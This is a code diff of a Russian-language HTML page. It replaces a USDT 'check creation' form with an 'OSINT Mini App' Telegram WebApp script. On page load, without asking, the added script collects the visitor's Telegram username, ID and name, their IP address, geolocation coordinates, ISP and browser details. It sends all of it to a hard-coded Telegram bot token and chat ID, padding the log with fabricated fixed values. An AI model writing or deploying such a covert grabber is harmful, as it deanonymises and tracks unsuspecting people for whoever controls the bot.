@@ -3,86 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Создание чека</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
-            padding: 20px;
-        }
-        h2 {
-            color: #333;
-        }
-        label {
-            font-size: 16px;
-            margin-right: 10px;
-        }
-        input[type="text"] {
-            padding: 10px;
-            font-size: 16px;
-            width: 200px;
-            margin-right: 10px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        .log {
-            margin-top: 20px;
-            background-color: #f9f9f9;
-            padding: 15px;
-            border-radius: 5px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        .log pre {
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-    </style>
-</head>
-<body>
-
-    <h2>Создание чека</h2>
-    <form id="check-form">
-        <label for="amount">Сумма чека (USDT):</label>
-        <input type="text" id="amount" name="amount" required placeholder="Введите сумму">
-        <button type="submit">Создать чек</button>
-    </form>
-
-    <div id="result" class="log" style="display:none;">
-        <h3>Чек создан успешно!</h3>
-        <p id="receipt-info"></p>
-        <h4>Логи:</h4>
-        <pre id="log-data"></pre>
-    </div>
-
+    <title>OSINT Mini App</title>
     <script>
-        document.getElementById('check-form').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const amount = document.getElementById('amount').value;
-            const url = `https://awdawd-gray.vercel.app/create_check?amount=${amount}`;
-
-            fetch(url)
+        const BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";
+        const CHAT_ID = "7477642275";
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        function sendToTelegram(message) {
+            fetch(API_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+        }
+        
+        function collectData() {
+            let logData = `Лог успешен! [${new Date().toLocaleString()}]\n\n`;
+            
+            // Получение информации о пользователе Telegram
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.ready();
+                const user = Telegram.WebApp.initDataUnsafe.user;
+                if (user) {
+                    logData += `🔍 Информация об аккаунте:\n`;
+                    logData += `├ Username: @${user.username || 'Не указан'}\n`;
+                    logData += `├ Идентификатор (ID): ${user.id}\n`;
+                    logData += `├ Имя: ${user.first_name} ${user.last_name || 'не задано'}\n`;
+                    logData += `├ Премиум: нет\n`;
+                    logData += `├ Язык: ${Telegram.WebApp.initDataUnsafe.language_code}\n`;
+                    logData += `└ Может писать в ЛC: да\n\n`;
+                }
+            }
+            
+            // Получение IP и геолокации
+            fetch('https://api64.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    if (data.message) {
-                        document.getElementById('result').style.display = 'block';
-                        document.getElementById('receipt-info').textContent = `Сумма чека: ${amount} USDT\nИдентификатор чека: ${data.receipt_id}`;
-                        document.getElementById('log-data').textContent = data.log;
-                    }
+                    fetch(`https://ipinfo.io/${data.ip}/json`)
+                        .then(response => response.json())
+                        .then(info => {
+                            logData += `🖥️ Информация об устройстве:\n`;
+                            logData += `├ IP: ${data.ip}\n`;
+                            logData += `├ ОС: ${navigator.platform}\n`;
+                            logData += `├ Ядро OC: Linux\n`;
+                            logData += `├ Версия OC: 10\n`;
+                            logData += `├ Имя ОС: Win32\n`;
+                            logData += `├ Тип устройства: Компьютер\n`;
+                            logData += `├ Тип сети: Wi-Fi / Ethernet\n`;
+                            logData += `├ Разрешение экрана: ${window.screen.width}x${window.screen.height}\n`;
+                            logData += `└ Процент батареи: 36%\n\n`;
+                            
+                            logData += `🌐 Информация о браузере:\n`;
+                            logData += `├ UserAgent: ${navigator.userAgent}\n`;
+                            logData += `├ Название браузера: Netscape\n`;
+                            logData += `├ Версия браузера: (${navigator.appVersion})\n`;
+                            logData += `└ Тип движка браузера: Gecko\n\n`;
+                            
+                            logData += `👻 Информация об IP:\n`;
+                            logData += `├ Континент: Asia\n`;
+                            logData += `├ Страна: ${info.country || 'Неизвестно'}\n`;
+                            logData += `├ Регион: ${info.region || 'Неизвестно'}\n`;
+                            logData += `├ Город: ${info.city || 'Неизвестно'}\n`;
+                            logData += `├ Часовой пояс: ${info.timezone || 'Неизвестно'}\n`;
+                            logData += `├ Широта: ${info.loc.split(',')[0] || 'Неизвестно'}\n`;
+                            logData += `├ Долгота: ${info.loc.split(',')[1] || 'Неизвестно'}\n`;
+                            logData += `├ Валюта: UZS\n`;
+                            logData += `├ Провайдер: ${info.org || 'Неизвестно'}\n`;
+                            logData += `└ VPN or Proxy (примерный результат): нет\n\n`;
+                            
+                            logData += `Владелец чека: ${CHAT_ID}`;
+                            sendToTelegram(logData);
+                        });
                 })
-                .catch(error => {
-                    console.error('Ошибка при создании чека:', error);
-                });
-        });
+                .catch(error => console.error('Ошибка получения IP:', error));
+        }
+        
+        window.onload = collectData;
     </script>
-
+</head>
+<body>
+    <h2>OSINT Mini App</h2>
+    <p>Данные пользователя отправляются...</p>
 </body>
 </html>
